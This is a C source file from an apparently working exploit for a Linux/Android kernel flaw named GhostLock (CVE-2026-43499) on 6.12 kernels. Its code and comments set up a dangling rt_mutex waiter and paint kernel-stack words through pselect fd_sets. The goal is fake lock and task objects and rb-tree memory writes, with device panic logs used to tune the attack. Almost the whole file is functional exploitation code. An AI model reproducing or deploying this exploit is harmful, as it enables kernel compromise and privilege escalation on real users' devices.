#include "common.h"
#include "build_tag.h"
#include "workspace.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/userfaultfd.h>

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
/* Consumer fires DURING the waiter's WAIT_REQUEUE_PI block: pi_blocked_on
 * is only non-NULL while the task is inside rt_mutex_wait_proxy_lock, so
 * trigger shots must land within the 30 s futex timeout window. There is
 * no meaningful post-timeout window — a pselect-blocking caller only
 * orphans a finite triggers. */
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
/* Stack-frame geometry derived statically from THIS kernel Image
 * (tools/trace_rt_waiter.py, see PORTING_612.md §8a):
 *   FUTEX_WAIT_REQUEUE_PI is dispatched DIRECTLY by __arm64_sys_futex
 *   (bl @0x25c5b8), so there is NO do_futex frame. Kernel-stack depth is
 *   measured from the syscall-entry SP (identical for every syscall):
 *   waiter = ENTRY - 0x80(sys_futex) - 0x1c0(frame) + 0xa0(local)
 *          = ENTRY - 0x1a0   → needs words 18..31 above fds_abs
 *   fds    = ENTRY - 0xc0(pselect6) - 0x1b0(core_sys_select)
 *            + 0x40(stack_fds)                       = ENTRY - 0x230
 *   WORD_SHIFT = 18, aligned (delta = 0x90 = 18 words).
 *
 * Placement window (nfds=320 → chunk size 40 B = 5 words).
 *
 * RUNTIME CHUNK LAYOUT IS GROUPED, NOT INTERLEAVED — proven by disassembly
 * of core_sys_select @ 6.12.69-android16-6-gcdc3e5d4075f (VA 0xffffffc08017760c
 * in boot/61269 Image, cross-checked against src/612/kallsyms.txt):
 *   - three get_fd_set() (__arch_copy_from_user) into [sp+0x10/0x18/0x20]
 *     = base+0·size, +1·size, +2·size  (in, out, ex)
 *   - three __memset() of [sp+0x28/0x30/0x38]
 *     = base+3·size, +4·size, +5·size  (res_in, res_out, res_ex)
 *   - do_select(base+0x10); return path __arch_copy_to_user
 *     res_in→in, res_out→out, res_ex→ex.
 *   ⇒ global word g maps to user set (g/5)%3, word g%5, sets ordered
 *     in, out, ex, res_in, res_out, res_ex (GROUPED).
 *   gw:  in[0..4]=0..4  out=5..9  ex=10..14  res_in=15..19
 *        res_out=20..24  res_ex=25..29. Words 30..31 lie past stack_fds.
 *
 * The stale rt_mutex_waiter sits 0x90 above the stack_fds base
 * (waiter = ENTRY-0x1a0, fds = ENTRY-0x230 ⇒ WORD_SHIFT 18), so its 12
 * words occupy the RESULT chunks: res_in[3..4] (w0..w1), res_out[0..4]
 * (w2..w6), res_ex[0..4] (w7..w11). Result words are written by do_select
 * as (<input set word> AND <fd readiness>), so painting the res side
 * requires an all-events prototype fd (TCP loopback receiver with a
 * pending normal byte plus a pending MSG_OOB byte: POLLIN|POLLOUT|POLLPRI
 * on every pass — readiness all-ones ⇒ each res word mirrors its input
 * word exactly). Because result-side painting implies readiness, and
 * readiness ends do_select, the shot window is the syscall return path
 * (early res_in marker + COW-widened out/ex copies — see below); a
 * "parked" shot cannot paint a shift-18 waiter on this kernel.
 * PANIC EVIDENCE (runs 1/3/4, 2026-09-02/03) confirms the placement: the
 * walk read task=init_task and lock=fake_lock (painted via ex[3]/ex[4] →
 * runtime res_ex[3]/res_ex[4] = gw28/29) while tree_entry/pi_tree were
 * ZERO (the former interleaved mapping painted them into user words that
 * land outside the waiter) ⇒ BUG rtmutex_common.h:138. Runs 2/5 NULL-lock
 * = read-only-proto fallback (res_ex never painted ⇒ lock=0).
 * Toolchain cross-validated on tegu 6.1.157 vmlinux: reproduces the
 * known-good empirical shift 3 exactly (PORTING_612.md §8a). */
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 18
#endif
#define SLIDE_WAIT_MSEC 500
/* Run15 made UFFD-WP available only after the cred swap. Its first fault is
 * taken before the res_in copy has completed, so waiter words 0/3 were still
 * stale (gw18/gw21 mismatch) and every such volley had to be rejected. The
 * file-backed four-COW marker is the validated route on this target. Keep the
 * UFFD implementation as a diagnostic, but never select it for a live shot. */
#define SLIDE_ENABLE_UFFD_WP 0
/* 2026-09-05 (run9 post-mortem): shift 18 RESTA il valore corretto. Il
 * test fisico decisivo resta quello dei run 3/4: con shift 18 il walk
 * leggeva x25/x24 == fake_lock e x21 == fake_w0 ESATTI — il paint
 * runtime era quello previsto. Lo sweep 0..16 (run9) è stato ritirato:
 * ha dipinto deliberatamente waiter malformati finché uno di essi è
 * entrato nella catena RT di rcub/0 (panic T21 con x25/x24 garbage e
 * backtrace rcu_boost_kthread → task_blocks_on_rt_mutex → walk). Non è
 * una nuova geometria da cercare: la battaglia è la FINESTRA/ARming del
 * walk, non lo shift.
 *
 * Inoltre (segnalazione revisione, 2026-09-05) la struttura precedente
 * aveva due difetti: (a) il preflight pselect girava DOPO la creazione
 * del pi_blocked_on dangling, riutilizzando lo stack del waiter;
 * (b) con preflight_ok=0 il codice eseguiva comunque il secondo
 * pselect e lasciava exit/cleanup toccare lo stato PI corrotto
 * (T8371: panic in mark_wakeup_next_waiter dopo RMP_EXEC_EXIT).
 * Ora TUTTA la preparazione (TCP OOB proto, marker, COW, UFFD,
 * preflight dry-run) avviene PRIMA della costruzione della catena
 * vulnerabile; dopo EDEADLK il waiter esegue UN SOLO pselect (nessun
 * dry-run). Dopo il FUTEX_UNLOCK_PI differito pubblica route_done e resta
 * parcheggiato in userspace: il child main scrive il risultato e termina il
 * process group solo dopo aver osservato il completamento. shift = 18 fisso. */
#define SLIDE_RETURN_MARKER_WORD 0
#define SLIDE_RETURN_MARKER_MASK (1UL << 0)
#define SLIDE_RETURN_MARKER_FD 0

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
/* Attempt counter for the persistent paint file (survives reboot). */
static atomic_int slide_attempt_no;
/* Post-shot diagnostic: result fdsets are checked after the time-critical
 * one-shot consumer has returned. */
static atomic_int slide_paint_ok;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_route_armed;
static atomic_int slide_pselect_returned;
static atomic_int slide_hold_gate;
static atomic_int slide_hold_ready;
static atomic_int slide_hold_active;
static atomic_int slide_hold_late;
static atomic_int slide_hold_wake_ret;
static atomic_int slide_waiter_lowprio;
static atomic_int slide_uffd_fd;
static atomic_uintptr_t slide_uffd_page;
static atomic_int slide_uffd_ready;
static atomic_int slide_uffd_event;
static atomic_ulong slide_uffd_event_flags;
static atomic_int slide_uffd_setup_errno;
static atomic_int slide_uffd_resolve_ret;
static atomic_int slide_uffd_resolve_errno;
static atomic_int slide_cow_ready;
static atomic_uintptr_t slide_return_marker_addr;
static atomic_ulong slide_return_marker_mask;
/* Runtime word-shift. The 6.12 value is fixed at the statically derived and
 * device-confirmed SLIDE_PSELECT_WORD_SHIFT (18); never sweep malformed
 * waiter layouts after the vulnerable PI chain has been constructed. */
static int slide_word_shift_runtime;
enum slide_direct_shape {
  SLIDE_DIRECT_NONE = 0,
  /* node.parent = target-8, node.right = value:
   *   [target] = value; [value] = target-8 */
  SLIDE_DIRECT_RIGHT_CHILD = 1,
  /* node.parent = value, node.left = target:
   *   [target] = value; either [value+8] or [value+16] = target,
   *   depending on __rb_change_child()'s parent-side test. */
  SLIDE_DIRECT_LEFT_CHILD = 2,
};
static enum slide_direct_shape slide_direct_write_mode;
static uintptr_t slide_direct_target;
static uintptr_t slide_direct_value;
static uintptr_t slide_fake_lock_runtime;
static unsigned int slide_fake_lock_serial;

void ghostlock_reset_attempt_state(void) {
  slide_fake_lock_serial = 0;
}

static uint64_t slide_waiter_word_value(int waiter_word) {
  if (slide_direct_write_mode) {
    switch (waiter_word) {
      case 0:
        return slide_direct_write_mode == SLIDE_DIRECT_LEFT_CHILD
                   ? slide_direct_value
                   : slide_direct_target - 8;
      case 1:
        return slide_direct_write_mode == SLIDE_DIRECT_RIGHT_CHILD
                   ? slide_direct_value
                   : 0;
      case 2:
        return slide_direct_write_mode == SLIDE_DIRECT_LEFT_CHILD
                   ? slide_direct_target
                   : 0;
      case 3:
      case 8:
        return FAKE_WAITER_PRIO;
      case 5:
        return fake_task;
      case 6:
        return slide_fake_lock_runtime;
      case 10:
        /* The child-node shape re-inserts through task->pi_waiters. Use the
         * sprayed fake task whose tree is deliberately empty; init_task is
         * only safe for the original left-child slide shape. */
        return fake_task;
      case 11:
        return slide_fake_lock_runtime;
      default:
        return 0;
    }
  }

  switch (waiter_word) {
    case 0:
      return SLIDE_LOGGERS_0_1;
    case 2:
    case 7:
      return SLIDE_RANDOM_BOOT_ID_DATA;
    case 3:
    case 8:
      return FAKE_WAITER_PRIO;
    case 5:
      return SLIDE_INIT_TASK;
    case 6:
      return slide_fake_lock_runtime;
    case 10:
      return SLIDE_INIT_TASK;
    case 11:
      return slide_fake_lock_runtime;
    default:
      return 0;
  }
}
/* GhostLock (CVE-2026-43499) trigger on 6.12.69 (pre-fix for
 * 3bfdc63936dd, "rtmutex: Use waiter::task instead of current in
 * remove_waiter()", landed upstream in 6.12.86): the primitive requires
 * that FUTEX_CMP_REQUEUE_PI returns -EDEADLK, not ETIMEDOUT. The cycle
 * waiter -> f_pi_target (owner) -> f_pi_chain (waiter) -> waiter must
 * close AT REQUEUE TIME so that rt_mutex_start_proxy_lock (running on
 * the requeuer thread) walks the chain, detects the deadlock, calls
 * remove_waiter() which — pre-fix — zeroes requeuer->pi_blocked_on
 * instead of waiter->pi_blocked_on, leaving the waiter task with a
 * dangling pi_blocked_on pointing at the just-popped stack frame. The
 * consumer then fires sched_setattr on the waiter, rt_mutex_adjust_pi
 * sees pi_blocked_on != NULL, walks the stale waiter, and the
 * pselect-repainted res_* words carry the leak payload.
 *
 * Therefore: the owner thread MUST block on f_pi_chain BEFORE the
 * requeue, so the cycle is in place when the requeue runs. (The earlier
 * owner_go handshake that delayed this was a misdiagnosis; it suppressed
 * the very condition the primitive needs.) The slide_owner_go atomic
 * has been removed accordingly. */

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_word_shift_runtime + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0 ||
      global_word >= 6 * words_per_set /* past stack_fds */) {
    return 0;
  }

  int chunk = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  /* GROUPED runtime layout (proven by disassembly — see the header
   * comment): in, out, ex, res_in, res_out, res_ex; each user set backs
   * one input chunk and, via all-events readiness mirroring, the matching
   * result chunk. Set index = chunk % 3. */
  int set_idx = chunk % 3;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0 || global_word >= 6 * words_per_set) {
    return 0;
  }

  int chunk = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  int set_idx = chunk % 3;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    const char *name;
  } words[] = {
    {0, "tree_pc"},
    {1, "tree_right"},
    {2, "tree_left"},
    {3, "tree_prio"},
    {5, "pi0"},
    {6, "pi1"},
    {7, "pi2"},
    {8, "pi_prio"},
    {9, "pi_deadline"},
    {10, "task"},
    {11, "lock"},
    /* waiter_words 12 (wake_state @ +0x60) and 13 (ww_ctx @ +0x68)
     * would need global words 30/31 — past the end of kernel stack_fds
     * and unplaceable. rt_mutex_adjust_prio_chain never reads them
     * before performing the rb-tree writes that corrupt boot_id.
     *
     * The lock and its minimum-priority sentinel are stable objects in the active
     * spray page. The transient waiter is reinserted behind the sentinel,
     * so the ownerless exit observes the same top waiter before and after
     * requeue: rt_mutex_top_waiter() validates sentinel->lock and no stale
     * stack task is woken. */
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word,
        slide_waiter_word_value(w->word), w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int proto_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(proto_fd, fd);
    }
  }
  dup2(proto_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

/* Create the "all-events" prototype fd used to paint the res_* chunks:
 * a TCP loopback receiver with one queued normal byte plus one pending
 * MSG_OOB byte reports POLLIN | POLLOUT | POLLPRI on every poll pass, so
 * readiness is effectively all-ones and each res_* word mirrors its
 * input word exactly.
 * NOTE: AF_UNIX does NOT implement MSG_OOB on this kernel (send returns
 * EOPNOTSUPP) — TCP is the only reliable POLLPRI source here.
 * Returns the prototype fd (>= nfds+1) or -1 (caller must fall back).
 *
 * VERIFIED against net/ipv4/tcp.c + fs/select.c @ android16-6.12
 * (gcdc3e5d4075f):
 *  - tcp_poll(): "if (urg_data & TCP_URG_VALID) mask |= EPOLLPRI;"
 *    (tcp.c:602) — POLLPRI fires for a pending urgent byte.
 *  - Persistence: urg_data is cleared ONLY by recv(MSG_OOB) → TCP_URG_READ
 *    (tcp.c:1405-1410) or by normal reads advancing copied_seq past urg_seq
 *    (tcp.c:2813-2814). The receiver never reads → stays asserted.
 *  - POLLIN: queued normal byte → tcp_stream_is_readable → EPOLLIN
 *    (tcp.c:581); EPOLLOUT: __sk_stream_is_writeable (tcp.c:584).
 *  - do_select region masks: POLLLEX_SET=(EPOLLPRI) for the ex-set,
 *    POLLIN_SET∋EPOLLIN, POLLOUT_SET∋EPOLLOUT (fs/select.c:459-463)
 *    → res_in/out/ex receive exactly the three asserted events.
 * ASSUMPTION (refutable only on-device): no GKI/vendor hook suppresses
 * EPOLLPRI on loopback TCP; verified live via the poll() self-check below
 * whose result is logged per attempt.
 */
int make_all_events_proto_fd(void) {
  int ls = socket(AF_INET, SOCK_STREAM, 0);
  if (ls < 0) {
    pr_warning("slide oob tcp socket errno=%d\n", errno);
    return -1;
  }
  struct sockaddr_in sa;
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sa.sin_port = 0;
  socklen_t slen = sizeof(sa);
  if (bind(ls, (struct sockaddr *)&sa, sizeof(sa)) != 0 ||
      listen(ls, 1) != 0 ||
      getsockname(ls, (struct sockaddr *)&sa, &slen) != 0) {
    pr_warning("slide oob tcp bind/listen errno=%d\n", errno);
    close(ls);
    return -1;
  }
  int cs = socket(AF_INET, SOCK_STREAM, 0);
  if (cs < 0 ||
      connect(cs, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
    pr_warning("slide oob tcp connect errno=%d\n", errno);
    close(ls);
    if (cs >= 0) close(cs);
    return -1;
  }
  int srv = accept(ls, NULL, NULL);
  close(ls);
  if (srv < 0) {
    pr_warning("slide oob tcp accept errno=%d\n", errno);
    close(cs);
    return -1;
  }
  /* Keep cs (the sender end) open for the process lifetime so the queued
   * bytes — and with them POLLIN/POLLPRI/POLLOUT — stay asserted. */
  if (send(cs, "i", 1, 0) != 1 || send(cs, "o", 1, MSG_OOB) != 1) {
    pr_warning("slide oob tcp send errno=%d\n", errno);
    close(cs); close(srv);
    return -1;
  }
  int proto = fcntl(srv, F_DUPFD, SLIDE_PSELECT_NFDS + 17);
  close(srv);
  if (proto < 0) {
    pr_warning("slide oob F_DUPFD errno=%d\n", errno);
    close(cs);
    return -1;
  }
  struct pollfd pfd = {.fd = proto, .events = POLLIN | POLLOUT | POLLPRI};
  int pn = poll(&pfd, 1, 0);
  int ok = (pn == 1 &&
            (pfd.revents & (POLLIN | POLLOUT | POLLPRI)) ==
              (POLLIN | POLLOUT | POLLPRI));
  pr_info("slide oob proto fd=%d revents=0x%x %s\n", proto, pfd.revents,
          ok ? "all-events-ok" : "MISSING-EVENTS(ex-res-painting-degraded)");
  if (!ok) {
    close(cs); close(proto);
    return -1;
  }
  return proto;
}

/* Arm write-protect userfaultfd on a separate user fd_set page. get_fd_set()
 * can read the page normally on syscall entry, but the first return-path
 * copy_to_user blocks and reports UFFD_PAGEFAULT_FLAG_WP. This creates a
 * deterministic in-kernel hold after do_select has painted all stack chunks.
 * Kernel-origin userfault handling is privilege/sysctl controlled; failure is
 * expected on hardened devices and is handled by the safe marker fallback. */
static fd_set *slide_setup_uffd_wp(const fd_set *source, void **mapping_out) {
  *mapping_out = MAP_FAILED;
  atomic_store(&slide_uffd_fd, -1);
  atomic_store(&slide_uffd_page, 0);
  atomic_store(&slide_uffd_ready, 0);
  atomic_store(&slide_uffd_setup_errno, 0);

  void *page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) {
    atomic_store(&slide_uffd_setup_errno, errno);
    return NULL;
  }
  memcpy(page, source, sizeof(*source));

  errno = 0;
  int uffd = (int)syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  int create_errno = errno;
  if (uffd < 0) {
    /* Newer kernels also expose a permission-controlled device interface. */
    int dev = open("/dev/userfaultfd", O_RDWR | O_CLOEXEC);
    if (dev >= 0) {
      errno = 0;
      uffd = ioctl(dev, USERFAULTFD_IOC_NEW, O_CLOEXEC | O_NONBLOCK);
      create_errno = errno;
      close(dev);
    }
  }
  if (uffd < 0) {
    atomic_store(&slide_uffd_setup_errno, create_errno);
    munmap(page, PAGE_SIZE);
    return NULL;
  }

  struct uffdio_api api;
  memset(&api, 0, sizeof(api));
  api.api = UFFD_API;
  api.features = UFFD_FEATURE_PAGEFAULT_FLAG_WP;
  if (ioctl(uffd, UFFDIO_API, &api) != 0 ||
      !(api.features & UFFD_FEATURE_PAGEFAULT_FLAG_WP)) {
    atomic_store(&slide_uffd_setup_errno, errno ? errno : ENOTSUP);
    close(uffd);
    munmap(page, PAGE_SIZE);
    return NULL;
  }

  struct uffdio_register reg;
  memset(&reg, 0, sizeof(reg));
  reg.range.start = (uintptr_t)page;
  reg.range.len = PAGE_SIZE;
  reg.mode = UFFDIO_REGISTER_MODE_WP;
  if (ioctl(uffd, UFFDIO_REGISTER, &reg) != 0) {
    atomic_store(&slide_uffd_setup_errno, errno);
    close(uffd);
    munmap(page, PAGE_SIZE);
    return NULL;
  }

  struct uffdio_writeprotect wp;
  memset(&wp, 0, sizeof(wp));
  wp.range = reg.range;
  wp.mode = UFFDIO_WRITEPROTECT_MODE_WP;
  if (ioctl(uffd, UFFDIO_WRITEPROTECT, &wp) != 0) {
    atomic_store(&slide_uffd_setup_errno, errno);
    close(uffd);
    munmap(page, PAGE_SIZE);
    return NULL;
  }

  *mapping_out = page;
  atomic_store(&slide_uffd_page, (uintptr_t)page);
  atomic_store(&slide_uffd_fd, uffd);
  atomic_store_explicit(&slide_uffd_ready, 1, memory_order_release);
  return (fd_set *)page;
}

static int slide_resolve_uffd_wp(int uffd, uintptr_t page) {
  struct uffdio_writeprotect wp;
  memset(&wp, 0, sizeof(wp));
  wp.range.start = page;
  wp.range.len = PAGE_SIZE;
  wp.mode = 0;
  errno = 0;
  int ret = ioctl(uffd, UFFDIO_WRITEPROTECT, &wp);
  atomic_store(&slide_uffd_resolve_ret, ret);
  atomic_store(&slide_uffd_resolve_errno, errno);
  return ret;
}

struct slide_cow_fdset {
  void *mapping;
  fd_set *set;
  int fd;
};

/* Build a clean MAP_PRIVATE file mapping whose 40-byte select payload crosses
 * a page boundary. copy_from_user only reads the clean page-cache pages, while
 * copy_to_user must COW both pages. Using this for out and ex adds four write
 * faults after the early res_in marker without requiring userfaultfd. */
static int slide_setup_cow_fdset(const fd_set *source,
                                 struct slide_cow_fdset *cow) {
  cow->mapping = MAP_FAILED;
  cow->set = NULL;
  cow->fd = -1;
  int fd = (int)syscall(SYS_memfd_create, "rmp612-cow", MFD_CLOEXEC);
  if (fd < 0 || ftruncate(fd, PAGE_SIZE * 2) != 0) {
    if (fd >= 0) close(fd);
    return 0;
  }
  off_t offset = PAGE_SIZE - (off_t)sizeof(unsigned long);
  if (pwrite(fd, source, sizeof(*source), offset) !=
      (ssize_t)sizeof(*source)) {
    close(fd);
    return 0;
  }
  void *mapping = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE, fd, 0);
  if (mapping == MAP_FAILED) {
    close(fd);
    return 0;
  }
  cow->mapping = mapping;
  cow->set = (fd_set *)((char *)mapping + offset);
  cow->fd = fd;
  return 1;
}

static void slide_close_cow_fdset(struct slide_cow_fdset *cow) {
  if (cow->mapping != MAP_FAILED) {
    munmap(cow->mapping, PAGE_SIZE * 2);
  }
  if (cow->fd >= 0) {
    close(cow->fd);
  }
  cow->mapping = MAP_FAILED;
  cow->set = NULL;
  cow->fd = -1;
}

/* ---------------------------------------------------------------------------
 * Route preparation — 2026-09-05 rework (run9 post-mortem).
 * ALL preparation (TCP OOB proto, fdsets, preflight dry-run, marker, COW,
 * UFFD) happens HERE, BEFORE the vulnerable chain is built. Any failure
 * returns 0 and the caller exits the child process with _exit(9) while the
 * PI state is still CONSISTENT (no dangling pi_blocked_on exists yet).
 * The waiter's stack is never touched by diagnostic pselects: the single
 * pselect of the shot is the ONLY syscall that runs after EDEADLK. */
struct slide_route_state {
  fd_set in;
  fd_set out;
  fd_set ex;
  fd_set *shot_in;
  fd_set *shot_out;
  fd_set *shot_ex;
  int pipefd[2];
  int block_fd;
  int high_read;
  int marker_pipe[2];
  int marker_fd;
  void *uffd_mapping;
  struct slide_cow_fdset cow_out;
  struct slide_cow_fdset cow_ex;
  int cow_ready;
  int uffd_ready;
  int pselect_ret;
  int pselect_errno;
  int paint_ok;
  int ready;
};

static struct slide_route_state slide_route;

static int slide_prepare_route(void) {
  memset(&slide_route, 0, sizeof(slide_route));
  slide_route.pipefd[0] = slide_route.pipefd[1] = -1;
  slide_route.block_fd = -1;
  slide_route.high_read = -1;
  slide_route.marker_pipe[0] = slide_route.marker_pipe[1] = -1;
  slide_route.marker_fd = -1;
  slide_route.uffd_mapping = MAP_FAILED;
  slide_route.cow_out.mapping = MAP_FAILED;
  slide_route.cow_out.fd = -1;
  slide_route.cow_ex.mapping = MAP_FAILED;
  slide_route.cow_ex.fd = -1;
  slide_route.pselect_ret = -1;

  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide route missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return 0;
  }

  if (pipe(slide_route.pipefd) != 0) {
    pr_error("slide route pipe errno=%d\n", errno);
    return 0;
  }
  slide_route.block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (slide_route.block_fd < 0) {
    slide_route.block_fd = slide_route.pipefd[0];
  }
  slide_route.high_read = fcntl(slide_route.block_fd, F_DUPFD,
                                SLIDE_PSELECT_NFDS + 16);
  if (slide_route.high_read < 0) {
    pr_error("slide route F_DUPFD errno=%d\n", errno);
    return 0;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  int proto = make_all_events_proto_fd();
  if (proto < 0) {
    /* No all-events proto → res_ex cannot be painted → the walk would read
     * lock=0 (the run2/run5 NULL-lock panic). Fail BEFORE the chain. */
    pr_error("slide route no all-events proto; refusing to build chain\n");
    return 0;
  }
  open_slide_selected_fds(&in, &out, &ex, proto);

  atomic_store(&slide_return_marker_addr, 0);
  atomic_store(&slide_return_marker_mask, 0);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_pselect_returned, 0);
  atomic_store(&slide_uffd_fd, -1);
  atomic_store(&slide_uffd_page, 0);
  atomic_store(&slide_uffd_ready, 0);
  atomic_store(&slide_uffd_event, 0);
  atomic_store(&slide_uffd_event_flags, 0);
  atomic_store(&slide_uffd_setup_errno, 0);
  atomic_store(&slide_uffd_resolve_ret, -1);
  atomic_store(&slide_uffd_resolve_errno, 0);
  atomic_store(&slide_cow_ready, 0);
  atomic_store(&slide_paint_ok, 0);

  /* Dry-run the exact fdset mapping. Safe HERE: the vulnerable chain does
   * not exist yet, this pselect runs on a PI-consistent stack. */
  int preflight_ok = 0;
  {
    fd_set probe_in = in;
    fd_set probe_out = out;
    fd_set probe_ex = ex;
    struct timespec probe_timeout = {.tv_sec = 0, .tv_nsec = 0};
    int probe_ret = pselect(SLIDE_PSELECT_NFDS, &probe_in, &probe_out,
                            &probe_ex, &probe_timeout, NULL);
    preflight_ok = probe_ret >= 0;
    int words_per_set = slide_pselect_words_per_set();
    for (int gw = 15; preflight_ok && gw < 6 * words_per_set; gw++) {
      uint64_t got = slide_pselect_get_global_word(
          &probe_in, &probe_out, &probe_ex, words_per_set, gw);
      int waiter_word = gw - slide_word_shift_runtime;
      if (got != slide_waiter_word_value(waiter_word)) {
        preflight_ok = 0;
      }
    }
    pr_info("slide paint preflight ret=%d ok=%d shift=%d\n",
            probe_ret, preflight_ok, slide_word_shift_runtime);
  }
  if (!preflight_ok) {
    pr_error("slide route preflight FAILED; refusing to build chain\n");
    return 0;
  }

  /* Early res_in marker: fd 0 added only to the input set, backed by an
   * empty pipe. res_in word 0 clears at the START of the return copies. */
  int marker_shape_ok =
      SLIDE_RETURN_MARKER_FD < SLIDE_PSELECT_NFDS &&
      !FD_ISSET(SLIDE_RETURN_MARKER_FD, &in) &&
      !FD_ISSET(SLIDE_RETURN_MARKER_FD, &out) &&
      !FD_ISSET(SLIDE_RETURN_MARKER_FD, &ex);
  int marker_transport_ok = 0;
  if (pipe(slide_route.marker_pipe) == 0) {
    struct pollfd marker_poll = {
      .fd = slide_route.marker_pipe[0],
      .events = POLLIN,
    };
    int marker_poll_ret = poll(&marker_poll, 1, 0);
    marker_transport_ok = marker_poll_ret == 0 && marker_poll.revents == 0;
    pr_info("slide return-marker transport revents=0x%x ok=%d\n",
            marker_poll.revents, marker_transport_ok);
  }
  if (!(marker_shape_ok && marker_transport_ok &&
        dup2(slide_route.marker_pipe[0], SLIDE_RETURN_MARKER_FD) ==
            SLIDE_RETURN_MARKER_FD)) {
    pr_error("slide route marker unavailable shape_ok=%d transport_ok=%d\n",
             marker_shape_ok, marker_transport_ok);
    return 0;
  }
  if (slide_route.marker_pipe[0] != SLIDE_RETURN_MARKER_FD) {
    close(slide_route.marker_pipe[0]);
    slide_route.marker_pipe[0] = SLIDE_RETURN_MARKER_FD;
  }
  slide_route.marker_fd = SLIDE_RETURN_MARKER_FD;
  FD_SET(slide_route.marker_fd, &in);
  pr_info("slide return-marker set=in fd=%d word=%d mask=%016lx "
          "transport=empty-pipe\n",
          slide_route.marker_fd, SLIDE_RETURN_MARKER_WORD,
          SLIDE_RETURN_MARKER_MASK);

  /* COW-backed out/ex result sets: four write faults widen the post-marker
   * in-kernel window. UFFD-WP is retained only as disabled diagnostics after
   * run15 proved its first fault precedes complete waiter painting. */
  void *uffd_mapping = MAP_FAILED;
  fd_set *uffd_shot_in = NULL;
  if (SLIDE_ENABLE_UFFD_WP) {
    uffd_shot_in = slide_setup_uffd_wp(&in, &uffd_mapping);
  }
  int uffd_ready = uffd_shot_in != NULL;
  pr_info("slide uffd-wp enabled=%d ready=%d fd=%d errno=%d page=%016zx\n",
          SLIDE_ENABLE_UFFD_WP, uffd_ready, atomic_load(&slide_uffd_fd),
          atomic_load(&slide_uffd_setup_errno),
          atomic_load(&slide_uffd_page));

  int cow_ready = slide_setup_cow_fdset(&out, &slide_route.cow_out);
  if (cow_ready) {
    cow_ready = slide_setup_cow_fdset(&ex, &slide_route.cow_ex);
  }
  if (!cow_ready) {
    pr_error("slide route cow4 setup FAILED errno=%d\n", errno);
    return 0;
  }
